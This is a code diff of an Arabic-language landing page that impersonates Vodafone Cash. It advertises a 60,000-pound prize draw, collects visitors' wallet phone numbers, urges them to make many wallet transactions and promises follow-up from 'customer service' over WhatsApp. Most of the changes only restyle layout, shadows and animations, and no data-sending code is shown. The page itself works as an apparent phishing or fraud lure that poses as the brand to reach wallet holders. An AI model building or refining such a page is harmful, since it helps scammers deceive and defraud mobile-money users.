@@ -10,10 +10,10 @@
     <link rel="shortcut icon" type="image/png" href="logo1.png">
     <link rel="apple-touch-icon" href="logo1.png">
 
-    <meta name="description" content="مسابقة فودافون كاش وسحب الستين ألف فودافون كاش على 60 ألف جنيه. سجل رقم محفظتك الشغال وادخل السحب.">
+    <meta name="description" content="مسابقة فودافون كاش وسحب الستين الف فودافون كاش على 60 ألف جنيه. سجل رقم محفظتك الشغال وادخل السحب.">
     <meta name="keywords" content="مسابقة فودافون كاش, فودافون كاش, كاش, مسابقة الستين الف فودافون كاش, سحب الستين الف فودافون كاش">
     <meta property="og:title" content="مسابقة فودافون كاش">
-    <meta property="og:description" content="مسابقة الستين ألف فودافون كاش وسحب الستين ألف فودافون كاش على 60 ألف جنيه.">
+    <meta property="og:description" content="مسابقة الستين الف فودافون كاش وسحب الستين الف فودافون كاش على 60 ألف جنيه.">
     <meta property="og:type" content="website">
     
     <!-- Tailwind CSS -->
@@ -40,8 +40,8 @@
                         }
                     },
                     boxShadow: {
-                        'cta': '0 12px 24px -6px rgba(230, 0, 0, 0.35)',
-                        'cta-hover': '0 18px 32px -6px rgba(230, 0, 0, 0.45)',
+                        'cta': '0 14px 28px -6px rgba(230, 0, 0, 0.35)',
+                        'cta-hover': '0 20px 35px -6px rgba(230, 0, 0, 0.45)',
                     }
                 }
             }
@@ -52,21 +52,13 @@
         body { 
             -webkit-tap-highlight-color: transparent;
             background-color: #ffffff;
-            background-image: radial-gradient(circle at 50% 0%, rgba(230, 0, 0, 0.05) 0%, transparent 55%);
+            background-image: radial-gradient(circle at 50% 0%, rgba(230, 0, 0, 0.045) 0%, transparent 50%);
         }
 
         input[type="tel"]::-webkit-inner-spin-button,
         input[type="tel"]::-webkit-outer-spin-button {
             -webkit-appearance: none;
             margin: 0;
-        }
-
-        @keyframes floatSlow {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-4px); }
-        }
-        .animate-float {
-            animation: floatSlow 4s ease-in-out infinite;
         }
 
         @keyframes shake {
@@ -82,58 +74,59 @@
 <body class="text-slate-900 antialiased min-h-screen flex flex-col items-center justify-center px-6 py-12 sm:px-10 lg:py-16 selection:bg-vodafone selection:text-white">
 
     <!-- Free Open Space Container -->
-    <main class="w-full max-w-md mx-auto flex flex-col items-center text-center space-y-10 sm:space-y-12">
+    <main class="w-full max-w-md mx-auto flex flex-col items-center text-center space-y-9">
         
         <!-- 1. Brand Logo -->
         <div class="w-full flex justify-center">
-            <div class="animate-float">
-                <img 
-                    src="logo.png" 
-                    alt="مسابقة فودافون كاش - سحب الستين الف فودافون كاش" 
-                    class="w-full max-w-[260px] sm:max-w-[300px] h-auto object-contain mix-blend-multiply" 
-                    onerror="this.style.display='none'"
-                >
-            </div>
+            <img 
+                src="logo.png" 
+                alt="مسابقة فودافون كاش - سحب الستين الف فودافون كاش" 
+                class="w-full max-w-[250px] sm:max-w-[280px] h-auto object-contain mix-blend-multiply" 
+                onerror="this.style.display='none'"
+            >
         </div>
 
-        <!-- 2. Title, Steps & Qualification Guide (Egyptian Dialect) -->
-        <div class="space-y-5">
-            <h1 class="text-2xl sm:text-3xl font-black text-slate-900 leading-tight tracking-tight">
+        <!-- 2. Title, Two Steps & Qualification Section -->
+        <div class="w-full space-y-6">
+            <h1 class="text-3xl sm:text-4xl font-black text-slate-900 leading-tight tracking-tight">
                 سحب على <span class="text-vodafone">60 ألف جنيه</span>
             </h1>
 
-            <div class="space-y-2.5 max-w-sm mx-auto text-right">
-                <div class="flex items-start gap-2.5">
-                    <span class="w-5 h-5 rounded-full bg-vodafone-light text-vodafone text-xs font-extrabold flex items-center justify-center shrink-0 mt-0.5">1</span>
-                    <p class="text-sm sm:text-base text-slate-700 leading-relaxed font-semibold">
+            <!-- Two Steps -->
+            <div class="space-y-3 max-w-sm mx-auto text-right">
+                <div class="flex items-start gap-3">
+                    <span class="w-6 h-6 rounded-full bg-vodafone text-white text-xs font-extrabold flex items-center justify-center shrink-0 mt-0.5">1</span>
+                    <p class="text-sm sm:text-base text-slate-800 leading-relaxed font-bold">
                         اكتب رقم موبايلك اللي عليه المحفظة وشغال.
                     </p>
                 </div>
 
-                <div class="flex items-start gap-2.5">
-                    <span class="w-5 h-5 rounded-full bg-slate-100 text-slate-600 text-xs font-extrabold flex items-center justify-center shrink-0 mt-0.5">2</span>
-                    <p class="text-sm sm:text-base text-slate-600 leading-relaxed font-medium">
+                <div class="flex items-start gap-3">
+                    <span class="w-6 h-6 rounded-full bg-slate-100 text-slate-700 text-xs font-extrabold flex items-center justify-center shrink-0 mt-0.5">2</span>
+                    <p class="text-sm sm:text-base text-slate-600 leading-relaxed font-semibold">
                         يفضّل يكون الرقم عليه واتساب عشان نقدر نتواصل معاك بسهولة.
                     </p>
                 </div>
             </div>
 
-            <!-- Qualification Section -->
-            <div class="pt-3 border-t border-slate-100 max-w-sm mx-auto text-right space-y-2.5">
-                <h2 class="text-sm sm:text-base font-extrabold text-slate-900">
+            <!-- Qualification Section (Placed right below the two steps) -->
+            <div class="w-full max-w-sm mx-auto pt-4 border-t border-slate-100 text-right space-y-3">
+                <h2 class="text-base sm:text-lg font-black text-slate-900">
                     إزاي تأهل نفسك للفوز؟
                 </h2>
 
-                <div class="space-y-2 text-xs sm:text-sm text-slate-600 leading-relaxed font-medium">
-                    <p class="flex items-start gap-2">
+                <div class="space-y-2.5 text-xs sm:text-sm text-slate-600 leading-relaxed font-semibold">
+                    <p class="flex items-start gap-2.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-vodafone shrink-0 mt-2"></span>
                         <span>اعمل عمليات سحب وإيداع من الرقم اللي هتسجل بيه دلوقتي عشان تزود فرصة الفوز.</span>
                     </p>
-                    <p class="flex items-start gap-2">
+
+                    <p class="flex items-start gap-2.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-vodafone shrink-0 mt-2"></span>
                         <span>مش شرط تكون المبالغ كبيرة، المهم إن عدد التحويلات يكون هو الأكبر.</span>
                     </p>
-                    <p class="flex items-start gap-2">
+
+                    <p class="flex items-start gap-2.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-vodafone shrink-0 mt-2"></span>
                         <span>أول ما تسجل رقمك دلوقتي، خدمة العملاء هتبعتلك رسالة على الواتساب تتابع معاك، وممكن تكون إنت المحظوظ معانا.</span>
                     </p>
@@ -142,10 +135,10 @@
         </div>
 
         <!-- 3. Interactive Form -->
-        <form id="loginForm" class="w-full space-y-6" novalidate>
+        <form id="loginForm" class="w-full space-y-5" novalidate>
             <div class="space-y-2">
                 <div class="flex items-center justify-between px-1">
-                    <label for="phone" class="text-xs sm:text-sm font-bold text-slate-700">
+                    <label for="phone" class="text-xs sm:text-sm font-extrabold text-slate-800">
                         رقم الموبايل
                     </label>
                     <span id="charCount" class="text-xs font-bold text-slate-400 tabular-nums transition-colors" dir="ltr">
@@ -153,10 +146,9 @@
                     </span>
                 </div>
 
-                <!-- Input Container -->
-                <div id="inputBox" dir="ltr" class="group relative flex items-center bg-slate-50/70 rounded-2xl border-2 border-slate-200/90 focus-within:border-vodafone focus-within:bg-white focus-within:ring-4 focus-within:ring-vodafone/10 transition-all duration-200">
+                <!-- Clean Modern Input -->
+                <div id="inputBox" dir="ltr" class="relative flex items-center bg-slate-50/80 rounded-2xl border-2 border-slate-200 focus-within:border-vodafone focus-within:bg-white focus-within:ring-4 focus-within:ring-vodafone/10 transition-all duration-200">
                     
-                    <!-- Numeric Input -->
                     <input 
                         type="tel" 
                         id="phone" 
@@ -166,12 +158,12 @@
                         autocomplete="tel"
                         placeholder="010XXXXXXXX"
                         required
-                        class="w-full bg-transparent text-center text-lg sm:text-xl font-extrabold tracking-widest py-4 px-5 text-slate-900 focus:outline-none placeholder:text-slate-300 placeholder:font-normal placeholder:tracking-normal"
+                        class="w-full bg-transparent text-center text-xl sm:text-2xl font-black tracking-widest py-4 px-5 text-slate-900 focus:outline-none placeholder:text-slate-300 placeholder:font-semibold placeholder:tracking-wider"
                     >
 
                     <!-- Live Validation Checkmark -->
                     <div class="pr-4 flex items-center">
-                        <div id="validBadge" class="hidden w-6 h-6 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center transition-transform scale-100">
+                        <div id="validBadge" class="hidden w-6 h-6 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center">
                             <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
                                 <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
                             </svg>
@@ -180,7 +172,7 @@
                 </div>
 
                 <!-- Error Message -->
-                <div class="min-h-[20px] px-1 pt-0.5 text-right">
+                <div class="min-h-[20px] px-1 text-right">
                     <p id="errorMsg" class="hidden flex items-center gap-1.5 text-xs sm:text-sm text-vodafone font-bold">
                         <svg class="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
@@ -191,22 +183,20 @@
             </div>
 
             <!-- Primary CTA Button -->
-            <div class="pt-2">
-                <button 
-                    type="submit" 
-                    id="submitBtn"
-                    class="w-full relative overflow-hidden bg-gradient-to-l from-vodafone to-vodafone-dark hover:from-vodafone-dark hover:to-vodafone-darker text-white font-extrabold text-base sm:text-lg py-4 px-8 rounded-2xl shadow-cta hover:shadow-cta-hover transition-all duration-200 transform hover:-translate-y-0.5 active:translate-y-0 flex items-center justify-center gap-2.5 group"
-                >
-                    <span id="btnText">كمّل التسجيل</span>
-                    <svg id="btnArrow" class="w-5 h-5 transition-transform duration-200 group-hover:-translate-x-1" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
-                    </svg>
-                    <svg id="btnSpinner" class="hidden animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                </button>
-            </div>
+            <button 
+                type="submit" 
+                id="submitBtn"
+                class="w-full bg-vodafone hover:bg-vodafone-dark text-white font-extrabold text-base sm:text-lg py-4 px-8 rounded-2xl shadow-cta hover:shadow-cta-hover transition-all duration-200 transform hover:-translate-y-0.5 active:translate-y-0 flex items-center justify-center gap-2.5 group"
+            >
+                <span id="btnText">كمّل التسجيل</span>
+                <svg id="btnArrow" class="w-5 h-5 transition-transform duration-200 group-hover:-translate-x-1" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
+                </svg>
+                <svg id="btnSpinner" class="hidden animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </button>
         </form>
 
     </main>
@@ -241,7 +231,7 @@
             if (!errorMsg.classList.contains('hidden')) {
                 errorMsg.classList.add('hidden');
                 inputBox.classList.remove('border-vodafone', 'bg-vodafone-light');
-                inputBox.classList.add('border-slate-200/90');
+                inputBox.classList.add('border-slate-200');
             }
         });
 
@@ -252,7 +242,7 @@
 
             if (!isValidEgyptianNumber) {
                 errorMsg.classList.remove('hidden');
-                inputBox.classList.remove('border-slate-200/90', 'animate-shake');
+                inputBox.classList.remove('border-slate-200', 'animate-shake');
                 void inputBox.offsetWidth;
                 inputBox.classList.add('border-vodafone', 'bg-vodafone-light', 'animate-shake');
                 phoneInput.focus();
